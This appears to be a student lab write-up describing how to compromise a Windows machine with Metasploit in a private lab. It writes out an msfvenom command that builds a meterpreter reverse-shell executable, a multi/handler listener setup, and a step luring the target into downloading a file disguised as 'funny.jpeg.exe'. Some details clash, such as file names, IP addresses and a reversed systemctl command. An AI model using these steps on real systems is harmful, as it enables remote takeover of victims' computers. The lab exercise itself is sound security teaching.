# Compromising-windows-using-Metasploit
Compromising windows using Metasploit
# Metasploit
Compromising windows using Metasploit

# AIM:

To Compromise windows using Metasploit .

## DESIGN STEPS:

### Step 1:

Install kali linux either in partition or virtual box or in live mode

### Step 2:

Investigate on the various categories of tools as follows:

### Step 3:

Open terminal and try execute some kali linux commands

## EXECUTION STEPS AND ITS OUTPUT:
## PROGRAM:

Find the attackers ip address using ifconfig
## OUTPUT:
![ex6-1](https://github.com/user-attachments/assets/db010076-b807-43d7-b089-7a48a5c7c28d)

Create a malicious executable file fun.exe using msfvenom command
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.2 -f exe > fun.exe
copy the fun.exe into the apache /var/www/html folder
Start apache server
sudo systemctl apache2 start


## OUTPUT
![ex6-2](https://github.com/user-attachments/assets/8460517a-2884-432b-89cb-8961af21d1a6)

Invoke msfconsole:
## OUTPUT:


Type help or a question mark "?" to see the list of all available commands you can use inside msfconsole.

![ex6-3](https://github.com/user-attachments/assets/51ba3a25-e1f4-4db1-8aa4-2d14e45e9483)

Starting a command and control Server
use multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 0.0.0.0
exploit

![ex6-4](https://github.com/user-attachments/assets/05aab480-a6c4-4f94-81b4-8c266fbc6c4d)

On the target Windows machine, open a Web browser and open this URL, replacing the IP address with the IP address of your Kali machine:
http://192.168.149.243/funny.jpeg.exe
The file "fun.exe" downloads. 

![Screenshot 2025-04-22 154310](https://github.com/user-attachments/assets/69f9a0f2-9a31-413c-b5eb-877281c6d826)




## RESULT:
The Metasploit framework is  used to compromise windows and is examined successfully.
